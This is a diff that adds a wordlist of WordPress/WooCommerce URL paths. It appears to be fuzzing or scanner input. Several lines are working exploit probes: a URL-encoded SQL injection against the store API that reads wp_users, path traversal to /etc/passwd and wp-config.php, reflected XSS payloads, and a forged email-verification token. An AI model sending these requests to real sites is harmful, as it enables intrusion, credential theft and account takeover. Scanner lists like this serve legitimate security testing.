@@ -1,0 +1,17 @@
+/?wcal_action=checkout_link&user_email=test&validate={{replace_regex(code_response,
+/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
+/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
+/?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500
+/wp-admin/admin-ajax.php?action=admin_init&log_filename=../../../../../../../../../../../../../etc/passwd
+/wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php
+/wp-content/plugins/woocommerce/
+/wp-content/themes/storefront/functions.php
+/wp-content/themes/storefront/header.php
+/wp-content/themes/storefront/footer.php
+/wp-content/plugins/yith-woocommerce-wishlist/includes/class-yith-wcwl.php
+/wp-content/plugins/yith-woocommerce-wishlist/includes/class-yith-wcwl-frontend.php
+/wp-content/plugins/yith-woocommerce-wishlist/includes/functions-yith-wcwl.php
+
+/wp-content/plugins/swipehq-payment-gateway-woocommerce/test-plugin.php?api_url=api_url%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E 
+/wp-content/plugins/sagepay-server-gateway-for-woocommerce/includes/pages/redirect.php?page=</script>
+/wp-content/uploads/pdf-invoices/
